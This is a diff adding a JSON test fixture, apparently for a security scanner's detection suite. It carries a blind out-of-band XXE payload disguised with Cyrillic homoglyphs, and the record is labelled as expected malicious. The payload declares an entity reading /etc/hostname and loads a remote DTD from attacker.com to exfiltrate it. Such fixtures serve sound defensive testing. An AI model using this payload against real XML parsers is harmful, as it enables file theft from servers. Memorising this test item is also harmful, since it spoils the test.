@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "gt::output::out-xxe-blind-oob.txt::unicode-variations::0",
+  "base_sample_id": "gt::output::out-xxe-blind-oob.txt",
+  "generator_id": "unicode-variations",
+  "generator_version": "1.0.0",
+  "seed": -158686051,
+  "content": "# Mаrfaak AI Seсurity - XXЕ blind OОB\n\n**WARNING: Тhіs payloаd tests XXE blind ОOB.**\n\n<?хml version=\"1.0\" encоdіng=\"UTF-8\"?>\n<!DOCTYРЕ fоo [\n  <!ENTITY % file SYSTЕM \"fіle:///etc/hostname\">\n  <!ENTITY % dtd SYSТЕM \"httрs://attaсker.cоm/хxe.dtd\">\n  %dtd;\n]>\n<datа>Blіnd XXE exfіltrаtіon viа OОB сhannel</dаtа>",
+  "content_hash": "729efc9ec9d1dd379590ed995a07d8808fe9891d36bbdde8a9e6c51bdf4262ba",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "unicode:cyrillic-homoglyph",
+  "difficulty": "advanced"
+}
